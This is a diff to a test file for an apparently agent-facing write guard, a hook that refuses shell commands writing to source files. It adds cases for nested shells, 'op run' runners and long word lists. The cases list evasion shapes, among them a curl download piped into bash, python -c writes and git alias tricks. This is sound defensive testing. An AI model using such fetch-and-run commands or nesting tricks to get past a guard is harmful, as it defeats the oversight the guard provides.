@@ -329,6 +329,10 @@ describe("a redirect inside a nested shell is read like one typed directly (#511
     { shape: "a pipe into a shell", refused: () => `printf 'echo x > src/a.ts' | sh`, twin: () => `printf 'echo x > src/a.ts' | cat` },
     { shape: "a pipe into a shell told to read it", refused: () => `curl -s https://example.test/x | bash -s`, twin: () => `curl -s https://example.test/x | wc -l` },
     { shape: "a nest deeper than the guard reads", refused: () => nestShells("echo hi", 10), twin: () => nestShells("echo hi", 4) },
+    { shape: "a runner at the reader's depth, whose line the guard would otherwise leave unread (#521)",
+      refused: () => nestShells("op run -- echo hi", 8), twin: () => nestShells("op run -- echo hi", 5) },
+    { shape: "a runner's long word list is no nest, so it is read and passes (#521)",
+      refused: () => nestShells("echo hi", 9), twin: () => "op run -- a b c d e f g h i j k l m n o p q r s t u v w x y z" },
     { shape: "a substitution deeper than the reader reads",
       refused: () => `echo ${"$(echo ".repeat(12)}x${")".repeat(12)}`, twin: () => `echo ${"$(echo ".repeat(4)}x${")".repeat(4)}` },
   ];
@@ -435,6 +439,7 @@ describe("a redirect inside a nested shell is read like one typed directly (#511
       "python3 -c 'open(\"src/a.ts\", \"w\").write(\"x\")'",
       "sh ./write-it.sh", "source ./write-it.sh", "bash <(echo 'echo x > src/a.ts')", "sh < ./write-it.sh",
       "$(which tee) src/a.ts", "git -c alias.x='!echo x > src/a.ts' x",
+      `foo ${Array.from({ length: 40 }, (_, k) => `w${k}`).join(" ")} tee src/a.ts`,
     ]) {
       const r = judge(c, sh(line));
       expect(r.status, `${line} -- ${r.stderr.split("\n")[0]}`).toBe(0);
@@ -672,7 +677,7 @@ describe("the write guard ships, counts toward the breaker, and fails open on it
     const copy = freshDir("cairn-writeguard-plugin-");
     cpSync(SCRIPTS, join(copy, "scripts"), { recursive: true });
     writeFileSync(join(copy, "scripts", "shell-words.mjs"), "export function shellSegments() { throw new Error('broken reader'); }\n"
-      + "export const SHELLS = new Set();\n"
+      + "export const SHELLS = new Set();\nexport const MAX_NEST = 8;\nexport const RUNNER_HOPS = 3;\n"
       + ["argCommands", "assignVars", "commandName", "evalCommandString", "expandAssigned", "lineVars", "pagerCommands", "runnerCommands", "seedVars",
         "shellCommandString", "shellReadsStdin", "spellWords", "suCommandString", "tooDeep", "unwrap", "braceExpand"].map((n) => `export function ${n}() {}\n`).join(""));
     const r = judge(c, sh("echo x > src/x.ts"), true, join(copy, "scripts", "pretooluse-writeguard.mjs"));
@@ -706,8 +711,10 @@ describe("the write guard's header: Not seen block, sunset, axiom, and the rule 
       "a value only the run knows",
       "`>&` onto a file",
       "a quoted",
+      "dated 2026-11-05 (#521)",
+      "more than three runner guesses",
     ]) expect(block, phrase).toContain(phrase);
-    expect(block.split("\n").length, block).toBe(32);
+    expect(block.split("\n").length, block).toBe(36);
   });
 
   it("the header carries removeWhen: inside the 40-line window and derives: naming an axiom", () => {
